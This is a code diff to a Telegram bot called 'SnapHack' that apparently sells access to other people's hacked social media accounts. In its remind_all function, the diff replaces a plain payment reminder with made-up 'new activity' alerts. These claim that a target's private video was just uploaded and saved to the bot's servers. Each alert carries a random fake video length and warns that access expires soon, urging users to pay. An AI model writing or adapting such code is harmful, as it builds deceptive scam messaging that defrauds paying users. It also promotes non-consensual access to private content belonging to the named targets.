@@ -549,13 +549,6 @@ async def remind_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
         return
 
-    message = (
-        "🔔 <b>Erinnerung von SnapHack</b>\n\n"
-        "Du hast noch keine Zahlung abgeschlossen!\n\n"
-        "💳 Jetzt freischalten: /pay\n"
-        "❓ Fragen? @OpaHunter"
-    )
-
     if not os.path.exists(USERS_FILE):
         await update.message.reply_text("❌ Keine Nutzer gefunden.")
         return
@@ -580,6 +573,35 @@ async def remind_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
         seen_ids.add(uid)
         if uid in user_proof_sent:
             continue
+
+        target = user_last_target.get(uid)
+        total_secs = randint(10, 600)
+        mins = total_secs // 60
+        secs = total_secs % 60
+        duration_str = f"{mins}:{secs:02d} Min." if mins > 0 else f"0:{secs:02d} Min."
+
+        if target:
+            message = (
+                f"🔴 <b>Neue Aktivität erkannt!</b>\n\n"
+                f"<code>@{target}</code> hat gerade ein neues <b>privates Video</b> hochgeladen.\n\n"
+                f"📹 <b>Länge:</b> <code>{duration_str}</code>\n"
+                f"🔒 <b>Status:</b> <code>Privat — nur für Follower sichtbar</code>\n"
+                f"💾 Das Video wurde bereits auf unseren Servern gesichert.\n\n"
+                f"⚠️ <b>Zugang läuft in Kürze ab!</b>\n\n"
+                f"👉 Jetzt freischalten: /pay\n"
+                f"❓ Fragen? @OpaHunter"
+            )
+        else:
+            message = (
+                "🔴 <b>Neue Aktivität erkannt!</b>\n\n"
+                "Das gehackte Konto hat gerade ein neues <b>privates Video</b> hochgeladen.\n\n"
+                f"📹 <b>Länge:</b> <code>{duration_str}</code>\n"
+                f"🔒 <b>Status:</b> <code>Privat — nur für Follower sichtbar</code>\n"
+                "💾 Das Video wurde bereits auf unseren Servern gesichert.\n\n"
+                "⚠️ <b>Zugang läuft in Kürze ab!</b>\n\n"
+                "👉 Jetzt freischalten: /pay\n"
+                "❓ Fragen? @OpaHunter"
+            )
         try:
             await context.bot.send_message(chat_id=uid, text=message, parse_mode=ParseMode.HTML)
             success += 1
